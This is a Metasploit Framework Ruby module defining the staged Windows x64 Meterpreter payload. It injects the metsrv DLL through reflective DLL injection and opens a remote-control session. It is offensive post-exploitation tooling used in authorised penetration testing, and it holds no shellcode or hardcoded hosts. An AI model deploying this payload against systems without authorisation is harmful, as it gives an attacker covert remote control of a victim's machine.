##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/payload/windows/x64/reflectivedllinject'
require 'msf/base/sessions/meterpreter_x64_win'
require 'msf/base/sessions/meterpreter_options'
require 'meterpreter_binaries'

###
#
# Injects the x64 meterpreter server DLL via the Reflective Dll Injection payload
#
###

module Metasploit3

  include Msf::Payload::Windows::ReflectiveDllInject_x64
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows x64 Meterpreter',
      'Description'   => 'Inject the meterpreter server DLL via the Reflective Dll Injection payload (Windows x64) (staged)',
      'Author'        => [ 'sf' ],
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_x64_Win
    ))

    options.remove_option( 'LibraryName' )
    options.remove_option( 'DLL' )
  end

  def library_path
    MeterpreterBinaries.path('metsrv', 'x64.dll')
  end

end
